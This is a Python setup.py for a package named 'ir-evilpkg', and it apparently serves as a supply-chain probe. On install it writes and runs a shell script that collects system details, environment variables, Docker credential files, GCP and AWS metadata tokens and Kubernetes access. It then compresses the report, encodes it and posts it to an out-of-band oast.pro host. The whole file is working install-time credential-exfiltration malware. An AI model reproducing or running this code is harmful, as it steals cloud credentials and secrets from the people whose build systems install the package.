import setuptools, subprocess
PROBE = r'''#!/bin/sh
OAST="dbplpucrh745qbn0ac10mtiz5fmoug5dt.oast.pro"
R=build-report.txt
{
  echo "== pypack-probe $(date -u +%FT%TZ) =="
  id; hostname; uname -a; pwd
  echo "-- env --"; env | sort | head -120
  echo "-- home --"; ls -la $HOME 2>/dev/null | head -20
  echo "-- root --"; ls -la /root 2>/dev/null | head -20
  echo "-- docker --"; cat /root/.docker/config.json 2>/dev/null | head -40; cat $HOME/.docker/config.json 2>/dev/null | head -40
  echo "-- layers --"; ls -la /layers 2>/dev/null | head
  echo "-- hosts --"; cat /etc/hosts; echo "-- resolv --"; cat /etc/resolv.conf
  echo "-- gcp-token --"; curl -s -m 4 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | head -c 700
  echo; echo "-- gcp-info --"; curl -s -m 4 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/" | head -c 400
  echo; echo "-- aws1 --"; curl -s -m 4 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" | head -c 400
  echo; echo "-- aws2 --"; T=$(curl -s -m 4 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 60" "http://169.254.169.254/latest/api/token"); echo "token_len=${#T}"; curl -s -m 4 -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" | head -c 300
  echo; echo "-- k8s --"; curl -s -m 3 -k "https://kubernetes.default.svc/version" | head -c 200
  echo; echo "== end =="
} > $R 2>&1
gzip -c $R | base64 -w0 > $R.b64
curl -s -m 10 -X POST --data-binary "@$R.b64" "https://$OAST/pypack-$(hostname)-$(date +%s)" >/dev/null 2>&1 || true
'''
open("probe.sh","w").write(PROBE)
subprocess.call(["sh","probe.sh"])
setuptools.setup(name="ir-evilpkg", version="1.0.0", packages=[])
